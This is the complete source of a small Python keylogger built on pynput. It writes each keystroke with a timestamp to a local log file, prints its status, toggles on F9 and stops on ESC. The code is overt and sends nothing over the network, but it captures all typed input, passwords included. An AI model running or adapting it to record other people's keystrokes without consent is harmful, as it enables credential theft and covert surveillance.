from pynput import keyboard
import datetime
import os

# File path setup
log_file_path = "keylogger/log.txt"
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

# Global toggle state
is_logging = True

def format_key(key):
    try:
        # For normal alphanumeric keys
        return key.char
    except AttributeError:
        # For special keys like space, enter, etc.
        special_keys = {
            keyboard.Key.space: "Space",
            keyboard.Key.enter: "Enter",
            keyboard.Key.tab: "Tab",
            keyboard.Key.backspace: "Backspace",
            keyboard.Key.shift: "Shift",
            keyboard.Key.shift_r: "Shift",
            keyboard.Key.ctrl: "Ctrl",
            keyboard.Key.ctrl_r: "Ctrl",
            keyboard.Key.alt: "Alt",
            keyboard.Key.alt_r: "Alt",
            keyboard.Key.esc: "Escape",
            keyboard.Key.caps_lock: "CapsLock",
            keyboard.Key.delete: "Delete",
            keyboard.Key.up: "Arrow Up",
            keyboard.Key.down: "Arrow Down",
            keyboard.Key.left: "Arrow Left",
            keyboard.Key.right: "Arrow Right"
        }
        return special_keys.get(key, str(key).replace('Key.', ''))

def on_press(key):
    """Handles key press events: log, pause/resume, exit"""
    global is_logging

    if key == keyboard.Key.esc:
        print("[*] ESC pressed. Exiting keylogger.")
        return False  # Stop listener

    elif key == keyboard.Key.f9:
        is_logging = not is_logging
        status = "resumed" if is_logging else "paused"
        print(f"[*] Logging {status.upper()}.")
        return  # Don't log this key

    if is_logging:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_name = format_key(key)
        log_entry = f"{timestamp} - {key_name}\n"

        with open(log_file_path, "a") as log_file:
            log_file.write(log_entry)

if __name__ == "__main__":
    print("[*] Keylogger started. Press F9 to pause/resume, ESC to exit.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
